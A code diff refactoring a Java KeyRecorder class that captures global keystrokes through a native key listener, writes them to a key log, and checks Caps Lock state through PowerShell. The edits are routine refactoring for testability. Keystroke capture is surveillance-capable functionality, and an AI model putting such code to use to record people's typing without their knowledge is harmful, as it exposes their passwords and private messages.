@@ -74,22 +74,22 @@ public class KeyRecorder implements NativeKeyListener {
    *
    * @return Caps Lock state (true = locked | false = unlocked)
    */
-  boolean getCapsState() {
+  public boolean getCapsState() {
     ProcessBuilder build = new ProcessBuilder("powershell", "[Console]::CapsLock");
     build.directory(new File(Constants.RUNTIME_LOCATION));
 
     StringBuilder result = new StringBuilder();
     try {
-      Process proc = build.start();
-      BufferedReader out = new BufferedReader(new InputStreamReader(proc.getInputStream()));
-      PipeStream err = new PipeStream(proc.getErrorStream(), System.err);
+      Process proc = this.startProcess(build);
+      BufferedReader out = RMAC.fs.getReader(proc.getInputStream());
+      PipeStream err = PipeStream.make(proc.getErrorStream(), System.err);
       err.start();
 
       String curr;
       while ((curr = out.readLine()) != null) {
         result.append(curr.trim());
       }
-      System.out.println(result.toString());
+
       proc.waitFor();
       out.close();
     } catch (IOException | InterruptedException e) {
@@ -106,7 +106,7 @@ public class KeyRecorder implements NativeKeyListener {
     String code = Integer.toString(nke.getRawCode(), 16).toLowerCase();
     switch (key) {
       case "Caps Lock": {
-        isCaps = getCapsState();
+        isCaps = this.getCapsState();
         break;
       }
       case "Shift": {
@@ -182,7 +182,7 @@ public class KeyRecorder implements NativeKeyListener {
       case "8":
       case "9":
       case "0":
-        RMAC.keyLog.print(getDual(key));
+        RMAC.keyLog.print(this.getDual(key));
         break;
       default: {
         if (key.contains("Unknown")) {
@@ -214,5 +214,9 @@ public class KeyRecorder implements NativeKeyListener {
 
   public String getDual(String dual) {
     return isShift ? dualKeys.get(dual)[1] : dualKeys.get(dual)[0];
+  }
+
+  public Process startProcess(ProcessBuilder builder) throws IOException {
+    return builder.start();
   }
 }
